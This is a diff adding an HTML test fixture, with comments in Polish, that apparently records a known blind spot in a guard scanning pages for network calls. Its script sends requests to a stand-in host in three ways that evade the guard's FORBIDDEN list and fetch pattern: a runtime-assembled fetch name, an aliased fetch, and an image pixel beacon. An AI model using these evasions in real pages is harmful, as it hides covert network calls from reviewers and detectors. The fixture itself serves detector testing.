@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'">
+<title>przyneta B — wywolania sieciowe, ktore NIE WYGLADAJA na wywolania</title></head>
+<body>
+<!-- ZNANA DZIURA. Ta fixtura PRZECHODZI dzis i to nie jest przeoczenie w fixturze,
+     tylko zmierzona granica straznika. Zapisana, zeby bylo widac, kiedy przestanie
+     przechodzic. Szczegoly i granica klasy: patrz issue w naglowku asercji. -->
+<script>
+(function () {
+  /* 1. nazwa API skladana w czasie dzialania — lista FORBIDDEN szuka literalu */
+  var proto = "ht" + "tps://";
+  var host = ["telemetry", "example", "invalid"].join(".");
+  var call = window["fet" + "ch"];
+  call(proto + host + "/beacon", { method: "POST", body: "x" });
+
+  /* 2. alias bez nawiasu — wzorzec wymaga fetch\s*\( */
+  var f = window.fetch;
+  f(proto + host + "/second");
+
+  /* 3. ZWYKLY KOD, nie obfuskacja: obrazek jako zadanie sieciowe. Nie stoi
+        w znaczniku ladujacym zasob, wiec skan znacznikow go nie widzi, i nie
+        ma go na liscie FORBIDDEN. */
+  new Image().src = proto + host + "/pixel.gif";
+})();
+</script>
+</body></html>
